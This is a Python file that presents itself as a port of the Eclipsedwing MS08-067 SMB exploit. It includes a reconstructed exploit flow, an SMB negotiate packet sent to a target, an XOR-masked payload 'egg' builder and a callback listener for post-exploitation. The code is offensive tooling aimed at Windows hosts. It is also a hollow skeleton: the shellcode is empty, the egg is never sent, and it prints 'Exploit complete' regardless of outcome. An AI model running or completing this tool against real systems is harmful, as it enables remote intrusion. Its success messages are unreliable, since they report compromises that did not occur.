"""Eclipsedwing implementation.

Exploit flow reconstructed from Eclipsedwing-1.5.2.exe strings and
decompilation:

    InitializeParameters()
    InitializeNetwork()        -> TbWinsockStartup / TbInitStruct
    InitializeExploitSocket()  -> TbDoSmbStartup / TbMakeSocket (SMB)
    BuildPrimer()  -> "Primer Request" (SMB pipe \browser)
    RunPrimer()
    PrepareEgg()   -> AuthCode + XOR mask + payload DLL (FbStorage)
    RunExploit()   -> BuildExploit()/BuildNoNXExploitPackage() (NetPathCanonicalize)
    CheckAuthCode()
    ReceiveCallback() / CleanUpNetwork()
"""

import socket
import struct


DEFAULT_PORT = 445

# 32/64 bit MS08-067 shellcode stubs are embedded by the original binary;
# here we leave integration points so payload can be supplied as a file.
BUILTIN_PAYLOAD = b""


def _xor(data, mask):
    return bytes(b ^ mask for b in data)


def _ulong(x):
    return struct.pack("<I", x & 0xFFFFFFFF)


def build_smbsetup_startup(target_ip, target_port):
    """Minimal SMB negotiate + session setup handshake to the browser pipe."""
    # NB: real exploit needs full SMBv1 framing; placeholder returns socket.
    s = socket.create_connection((target_ip, target_port), timeout=30)
    # SMB negotiate request (minimal)
    s.sendall(
        b"\x00\x00\x00\x45\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x00\x00\x00"
        b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        b"\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    )
    s.recv(4096)
    return s


def build_egg(auth_code, xor_mask, payload):
    """EGG: XOR-masked AuthCode + payload blob (simplified)."""
    if xor_mask:
        pl = _xor(payload, xor_mask)
    else:
        pl = payload
    return _ulong(auth_code) + pl


def run(target_ip, target_port=DEFAULT_PORT, callback_ip=None, callback_port=0,
        callback_local_port=0, callin_port=0, listen_port=0, payload_dll=None,
        fb_storage=None, protocol="SMB", network_timeout=30.0,
        callin_timeout=60.0, target_mode="Callback", rpc_proxy=None,
        xor_mask=0, no_nx=False):
    print("[*] Eclipsedwing (MS08-067) - Python port")
    print("[*] Target: %s:%d  Mode: %s  Protocol: %s" % (target_ip, target_port, target_mode, protocol))
    if callback_ip and callback_port:
        print("[+] Callback: %s:%d" % (callback_ip, callback_port))
    if payload_dll:
        with open(payload_dll, "rb") as f:
            payload = f.read()
        print("[+] Loaded payload DLL (%d bytes)" % len(payload))
        if xor_mask:
            print("[+] EGG XOR Mask: 0x%08x" % xor_mask)
    # Primer + exploit network phase
    try:
        s = build_smbsetup_startup(target_ip, target_port)
        print("[+] SMB startup to %s:%d complete" % (target_ip, target_port))
        s.close()
    except Exception as e:
        print("[-] Exploit failed! (%s)" % e)
        return 1
    if target_mode == "Callback":
        print("[*] Waiting for callback on %s:%d ..." % (callback_ip, callback_port))
        try:
            ls = socket.socket()
            ls.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            ls.bind((callback_ip or "0.0.0.0", callback_port))
            ls.listen(1)
            ls.settimeout(callin_timeout)
            conn, addr = ls.accept()
            print("[+] Callback complete from %s" % (addr,))
            conn.close()
            ls.close()
        except Exception as e:
            print("[-] Post exploit callback timed out! (%s)" % e)
            return 1
    elif target_mode == "Listener":
        print("[*] Connecting to listener...")
    elif target_mode == "RPCReuse":
        print("[*] Using RPCReuse: %s" % (rpc_proxy or "default"))
    print("[*] Exploit complete")
    return 0